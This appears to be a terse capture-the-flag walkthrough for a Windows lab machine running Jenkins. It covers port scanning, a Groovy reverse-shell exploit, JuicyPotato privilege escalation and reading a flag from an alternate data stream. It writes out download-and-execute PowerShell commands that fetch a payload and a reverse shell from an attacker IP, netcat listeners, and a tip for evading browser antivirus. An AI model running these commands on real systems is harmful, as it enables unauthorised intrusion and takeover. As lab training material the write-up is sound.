Find open ports using NMAP

Its is found there is a hidden port 50000, use -P- in nmap scans for hidden ports

Dir search using Gobuster or FFuF to the port 50000 yields /askjeeves directory

Open 10.10.10.63:50000/askjeeves

It directs to Jenkins page

On the right-bottom cornet of the page, we can see current version of jenkins as 2.87 

Using groovy exploit code to get the user shell, which has less previlages --> https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76 --> Modify <IP Address> <Port> on the exploit, run it on jenkins console, use netcat listener on same port for getting user shell



Find out the permissions in using dir command

on finding impersonation enabled for normal user, using JuicyPotato.exe we can exploit this

click "Download" symbol in browser and click extract --> to bypass anti-virus check in browser, else exploit file will be downloaded emptry (0 Bytes)

File transfer => powershell -c  "Invoke-WebRequest -Uri http://10.10.16.90:8081/JuicyPotato.exe -outFile C:\Users\kohsuke\Desktop\JP.exe"

Output folder with file name should be specified mandatorily 

Once the JuicyPotato.exe is moved into the target

Now we need to download and move powershell script in ps1 format, which can be downloaded from 

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  --> rename it to shell.ps1 

Keep this shell.ps1 script in Kali machine -> add revershell command at end of the file Invoke-PowerShellTcp -Reverse -IPAddress <Kali IP> -Port <Any>

Create a .BAT file as below

powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.90:8000/shell.ps1')" --> adminshell.bat

Move adminshell.bat to target

Now execute Juicy Potato EXE in the target, give the arguments -t * -p adminshell.bat -l <port in mentioned in shell.ps1 file)

Use Netcar listender in Kali nc -nvlp <port mentioned in shell.ps1>

So, now we got the admin shell, use whoami or systeminfo to conform it

cd to Administrator/Deskop there you'll find hm.txt, which is not root

root is in same Desktop directory but dir command will not display it, there are commands to get files in alternate data streams

Use below set of commands to find the files from alternate streams and its contents, standard commands "dir" or "type" will not work here. 


Find the HIDDEN root.txt exist -->Get-item -Path C:\Users\Administrator\Desktop\hm.txt -stream *
Read contents from root.txt --> Get-Content -Path C:\Users\Administrator\Desktop\hm.txt -Stream root.txt
